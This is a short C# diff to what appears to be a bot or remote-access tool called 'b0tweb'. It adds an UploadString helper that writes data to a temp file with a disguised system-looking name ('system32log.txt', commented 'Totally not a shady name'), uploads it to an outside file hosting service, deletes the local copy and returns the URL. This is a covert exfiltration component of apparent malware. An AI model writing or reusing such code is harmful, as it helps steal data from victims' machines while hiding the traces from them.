@@ -61,5 +61,27 @@ namespace b0tweb
         {
             return FileHelper.GetBasePath() + @"\b0tweb_old.exe";
         }
+
+        /// <summary>
+        /// Uploads the data to file hosting service
+        /// </summary>
+        /// <param name="content">data string to upload</param>
+        /// <returns>url to the uploaded file</returns>
+        public static string UploadString(string content)
+        {
+            // Totally not a shady name
+            string path = FileHelper.GetTemporaryFilePath("system32log.txt");
+
+            using (StreamWriter writer = new StreamWriter(path))
+            {
+                writer.WriteLine(content);
+            }
+
+            string url = HTTPHelper.Upload(path);
+
+            FileHelper.DeleteFile(path);
+
+            return url;
+        }
     }
 }
